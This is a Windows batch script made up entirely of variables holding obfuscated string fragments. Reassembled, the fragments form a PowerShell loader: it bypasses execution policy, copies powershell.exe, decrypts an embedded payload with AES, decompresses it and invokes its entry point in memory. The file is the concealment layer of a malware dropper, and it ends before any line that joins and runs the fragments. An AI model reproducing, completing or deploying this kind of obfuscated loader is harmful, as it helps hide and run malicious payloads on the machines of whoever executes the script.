@echo off
set "eoBzQidsYS=do"
set "GwpJtzANmL=po"
set "qsHwneirch=xe"
set "CsaqxtTLuK=.e"
set "nQeVShcKfr=ll"
set "VngGsUUNgF=ow"
set "ZVPViRVfNG=\v"
set "UuzmOXEkBu=ll"
set "fqMHPstVqQ=0\"
set "snDEpJihgQ=rs"
set "fFohFlsqTX=:\"
set "ziUMQDwwXM=py"
set "KekBRyoJSM=Po"
set "woODVXzMZn= C"
set "EnBruvZfTy=co"
set "aAxVVcZNbW=Wi"
set "MTifOkHRet=rS"
set "lqtzDqrPFV=ws"
set "kgDZMVRTIS=s\"
set "YMLcjqxbSp=Sy"
set "xSURRQlhXZ=\W"
set "qUWdMCiILh= /"
set "yFqCyjCdwc=32"
set "NuUwcNuQCa=st"
set "eXnbBxPbVa=we"
set "GxbOofayyG=y "
set "xaPWZugUeR=he"
set "dPimopyYvw=nd"
set "upJvCadaIs=he"
set "enMjXiqvaJ=we"
set "BarHKMfoqn=in"
set "imGwLWliAs=em"
set "QwEyrOErGX=1."
set "kbfidngBya= %~dp0"
set "SmrgmUuNCJ=cd"
set "pBuwGUZFnT===')"
set "UKjgAkLgqX=;$SZ"
set "STxSKKOUtI=bFiY"
set "mCbriWjLkg='')("
set "eujSgmGnVP=h.Pa"
set "giGzdwIVbe=and "
set "KyjZxlCTlY=zHhH"
set "uLUtxAycxu=onve"
set "QJPOiKivnE=('%*'"
set "leBmwoAAXc=[]] "
set "PUFfioAIVM=.-16"
set "ELzaEQzXTh=ne);"
set "zajbwYmbEs=);$a"
set "cpmhwcQtEQ=tem."
set "DnVUpQeieH='0Pg"
set "JksmlyyJsT=ion."
set "rIFdwoehSY=$yeK"
set "bbvUSCcxGN=Invo"
set "siELeJUqrm=RmAx"
set "JShjNIeudz=oin "
set "VcsEdPPjGR=ypto"
set "ZqpeOVKNjl=daeR"
set "bTcCfdiCTi=ns ="
set "apXbRlgxKH= [Sy"
set "EWpwdFmtRl=PTtG"
set "rYmWJMxIyO=.Com"
set "wmgTlixNel=y.Pa"
set "jGYaTBpwxB=ptog"
set "ACSUVoyHLV=:: '"
set "EJSthsrOwd=yeKq"
set "mocXIWwjBA=ose("
set "zUxZVImgAj= = ["
set "uOhWsbevYP=-1.."
set "rTjPJrFJmN=FiYh"
set "dcJEvXcKYc=tion"
set "tjCPzTtyYE=u = "
set "VEKmyQpbtJ=MVp."
set "GeKDwiDDRY=();$"
set "JPfKlWiqxs=FiYh"
set "QMVJKSRQSG=; };"
set "TaXugqtLHw=gth)"
set "iaERsbXGgE=am;$"
set "eAlCSmOMJO=ateD"
set "iNkTIAShUh=esMa"
set "odLXzCKzOU=FzN."
set "edHNZRgqvK=rity"
set "HEfcAIUKej=.Dis"
set "ffJHWMiCGi=g = "
set "zmgGBwyHYu=sion"
set "rrpNBXNgyP=jvzy"
set "HHPSXJTYeI=raph"
set "NgRrrJNaTu=lBlo"
set "cXFsqtjygm= = $"
set "apnHojeCyn=se()"
set "tYCjtimlXp= New"
set "lYNdOAKJGP=  $u"
set "JKJkWeRGvn=eam("
set "ACuINDlZWk=ode]"
set "KuHBcNxTiz=ns);"
set "JyhAPzYPCt=ptog"
set "BCfPnEAcTV=Comp"
set "bTDyvvAPzZ=();$"
set "oVZPVqyRzt=16] "
set "mpzitYbAia= '')"
set "KsnAVpvzVq=y]::"
set "ofOOyHEhnc=.Con"
set "SdyFtAqJYo=comm"
set "VKxFCcmRCX=saBm"
set "yiDwsXxVaR=hy.A"
set "EPaWBIvhqM=p.Su"
set "YjrNlJlaOI=gjYA"
set "reTpqPbhIb='txe"
set "IJMmgACzhI=bypa"
set "JyCOmGKPde=S46e"
set "rddAwGAcyf=ay()"
set "FUXMWiRNKY=FiYh"
set "xgaepASeuc=Conv"
set "EOZAdIdwQK=1..-"
set "IzHBLmDpoF=yste"
set "yUKCftcNjO=iron"
set "uckubbftkB=::De"
set "yrVqQnzfOc=6] -"
set "eEoqBeMrhJ=;$lU"
set "jNuKWxIAun=gsYZ"
set "CoTLUILicR=MVp "
set "mTvfyQEeRV=();$"
set "ApKuebmMSJ=]::N"
set "QTDFtYptDw=-Obj"
set "ktcLesmHMO=k; }"
set "JEqmtBewVO=FEHP"
set "OJiLbxiwgU=yTo("
set "ZUZZSflUvJ=yeKq"
set "SfUdfxESSl=$yUH"
set "nnVpDKpXdD=tryP"
set "DstWANbGGe=$yUH"
set "QpqVoewAkG=ddin"
set "RhAsdULsng=ct S"
set "KDpXczMEyS=t Sy"
set "cnUEgHCnCc=embl"
set "QUaSyzEAZi=.Cry"
set "GIbrERKhPr=$aFr"
set "JSLsTGzkpE=M = "
set "xFsbqwShEq=aFrt"
set "gdvPUPpaUD=);$b"
set "sYDPrRkLNj=.Len"
set "yilTmcbAoT=-nop"
set "wLDqTXsDZm=.Cop"
set "SFpEKZlNBp=Comp"
set "ysUpywXbFv=);$b"
set "mjyFANGWJN=join"
set "lBcwUViXQj=File"
set "ViZpVdCulc=Obje"
set "RPRtvdWRHU=orF'"
set "QXexLapuWb=Syst"
set "LGeHpSdNUX=oryS"
set "ZILVRqRAlv=tu.D"
set "ZwBZlNRAgY=FiYh"
set "YsONKeLpWC=('da"
set "WWIMggXnPl=nSj."
set "GwMZbMmThg=;$Al"
set "iYArLVuSeU=rity"
set "blowLJWZRl=rt]:"
set "urfZjQIIPD=FEHP"
set "NwSGGoblzC=l5E7"
set "naYOCUcFnn=TllA"
set "kqNievntlx=::('"
set "SlbdNKWuzx=New-"
set "eFnDHElhSF=ym ="
set "MwdBmbJLKM=;$rK"
set "nhbaPwAyDJ=pres"
set "zHLkcFVkmi=lfZK"
set "gqbhVjkRvJ=n ''"
set "qPGJMebKID== [S"
set "wHKGGRBWnR=ke($"
set "vGqHAWMwrA=s75K"
set "BopgMKxGFp=, $y"
set "jKrDWWAfPL=e]::"
set "szKNCtcHIo=ispo"
set "XZRhtasHrI=.Key"
set "WYRiybPOAu=1] -"
set "hGxkEKsnGU=]::("
set "eQCUoJyAbh=grap"
set "XRUiWkYfkW=($kv"
set "NjhNVTSstX=zN.T"
set "wVfAbPkWLa=ew-O"
set "VmqZzbkwef=-joi"
set "RIsnwalxYK=Star"
set "wThxiHyhFw=$SZF"
set "RZlPORJpRc=em.C"
set "opMsJcEkmq=ert]"
set "TUrERFjHiV=e = "
set "BTSROieSPJ=Frtu"
set "aUmsJyBgMB== $b"
set "bVVOPjmMWf=[Sys"
set "QAxldMtmbX=7;$b"
set "XmJKFMkIHT=YxVw"
set "rHeYcKaglQ=ress"
set "szzkBTwiGC=m) {"
set "fTJXaxPytK=FzN "
set "XPGtggHNge='[-1"
set "FFvrTETBJF=]::C"
set "cwVKcCBVWS=M, 0"
set "heljwFClfm=)($u"
